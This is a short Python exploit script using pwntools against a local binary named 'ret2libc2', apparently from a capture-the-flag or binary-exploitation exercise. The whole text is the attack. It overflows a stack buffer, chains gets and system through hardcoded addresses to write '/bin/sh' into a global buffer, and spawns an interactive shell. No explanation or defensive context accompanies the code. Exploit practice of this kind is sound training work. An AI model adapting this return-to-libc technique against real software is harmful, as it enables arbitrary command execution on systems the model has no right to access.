from pwn import *

shell = process('./ret2libc2')

gets_addr = 0x8048460
system_addr = 0x8048490
pop_ebx_addr = 0x804843d
buf2_addr = 0x804a080

offset = 0x6c + 4

payload = b'A' * offset
payload += p32(gets_addr)
payload += p32(pop_ebx_addr)
payload += p32(buf2_addr)
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(buf2_addr)

shell.sendline(payload)

shell.sendline(b'/bin/sh')

shell.interactive()
